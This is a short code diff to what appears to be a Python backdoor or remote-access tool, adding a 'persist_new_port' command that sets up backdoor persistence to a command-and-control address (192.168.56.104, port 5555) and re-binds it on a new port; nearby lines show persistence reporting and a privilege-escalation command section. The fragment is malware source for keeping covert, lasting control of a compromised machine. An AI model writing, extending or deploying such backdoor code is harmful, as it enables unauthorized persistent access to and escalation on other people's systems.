@@ -308,6 +308,18 @@ def shell():
             except Exception as e:
                 reliable_send("Persistence info error: " + str(e))
                 
+        elif command == 'persist_new_port':
+            try:
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence('192.168.56.104', 5555)
+                success, msg = persistence_manager.reinitialize_with_new_port()
+                if success:
+                    reliable_send("Persistence: " + msg)
+                else:
+                    reliable_send("Persistence reinit error: " + msg)
+            except Exception as e:
+                reliable_send("Persistence new port error: " + str(e))
+                
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
             try:
